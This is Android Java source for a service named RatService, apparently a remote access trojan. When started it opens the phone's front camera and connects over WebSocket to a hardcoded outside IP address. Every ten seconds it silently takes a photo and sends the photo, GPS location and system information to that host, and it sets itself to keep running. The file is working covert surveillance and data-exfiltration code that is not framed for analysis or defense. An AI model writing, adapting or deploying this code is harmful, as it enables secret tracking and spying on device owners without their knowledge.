package kodeslacker.rat;

import android.annotation.TargetApi;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.hardware.Camera;
import android.location.Criteria;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.Build;
import android.os.Bundle;
import android.os.IBinder;
import android.telephony.TelephonyManager;
import android.util.Log;


import org.java_websocket.client.WebSocketClient;
import org.java_websocket.handshake.ServerHandshake;
import org.json.JSONException;
import org.json.JSONObject;


import java.net.URI;
import java.net.URISyntaxException;

import kodeslacker.library.GPSListener;
import kodeslacker.library.PhotoHandler;
import kodeslacker.library.SystemInfo;

public class RatService extends Service implements LocationListener{
    private WebSocketClient mWebSocketClient;
    private SystemInfo _systemInfo;
    private GPSListener _gps;
    private PhotoHandler _photoHandler;
    private int _cameraId;
    private Camera _camera;

    @Override
    public IBinder onBind(Intent intent) {
        throw new UnsupportedOperationException("Not yet implemented");
    }
    public RatService(){}
    @TargetApi(Build.VERSION_CODES.GINGERBREAD)
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        _systemInfo=new SystemInfo(this);
        _gps = new GPSListener(this, LocationManager.GPS_PROVIDER,(short)4);
        _photoHandler=new PhotoHandler(getApplicationContext());
        _cameraId = findFrontFacingCamera();
        _camera = Camera.open(_cameraId);


        URI uri = null;
        try {
            uri = new URI("ws://188.25.250.75:5445");
        } catch (URISyntaxException e) {
            e.printStackTrace();
        }
        mWebSocketClient = new WebSocketClient(uri) {
            @Override
            public void onOpen(ServerHandshake serverHandshake) {
                Log.i("Websocket", "Opened");
                Thread thread = new Thread() {
                    @Override
                    public void run() {
                        while (true) {
                            try {
                                sleep(10000);
                                mWebSocketClient.send(getInfo());
                            } catch (InterruptedException e) {
                                e.printStackTrace();
                            }
                        }
                    }
                };
                thread.start();
            }

            @Override
            public void onMessage(String s) {
                final String message = s;
                Log.i("Message", message);
            }

            @Override
            public void onClose(int i, String s, boolean b) {
                Log.i("Websocket", "Closed " + s);
            }

            @Override
            public void onError(Exception e) {
                Log.i("Websocket", "Error " + e.getMessage());
            }
        };

        mWebSocketClient.connect();
        return Service.START_STICKY;
    }
    @TargetApi(Build.VERSION_CODES.GINGERBREAD)
    public String getInfo() throws InterruptedException {
        _photoHandler._picture=null;
        _camera.takePicture(null, null,_photoHandler);
        while (_photoHandler._picture==null){
            Thread.sleep(1000);
        }


        JSONObject object = new JSONObject();
        try {
            object.put("SystemInfo",_systemInfo.getSystemInfo());
            object.put("Location", _gps.getCoordinates());
            object.put("Picture",_photoHandler._picture);
        } catch (JSONException e) {
            e.printStackTrace();
        }
        return object.toString();
    }

    @Override
    public void onLocationChanged(Location location) {
        _gps.getCoordinates(location);
    }

    @Override
    public void onStatusChanged(String provider, int status, Bundle extras) {

    }

    @Override
    public void onProviderEnabled(String provider) {

    }

    @Override
    public void onProviderDisabled(String provider) {

    }
    @TargetApi(Build.VERSION_CODES.GINGERBREAD)
    private int findFrontFacingCamera() {
        int cameraId = -1;
        // Search for the front facing camera
        int numberOfCameras = Camera.getNumberOfCameras();
        for (int i = 0; i < numberOfCameras; i++) {
            Camera.CameraInfo info = new Camera.CameraInfo();
            Camera.getCameraInfo(i, info);
            if (info.facing == Camera.CameraInfo.CAMERA_FACING_FRONT) {
                Log.d(":)", "Camera found");
                cameraId = i;
                break;
            }
        }
        return cameraId;
    }

}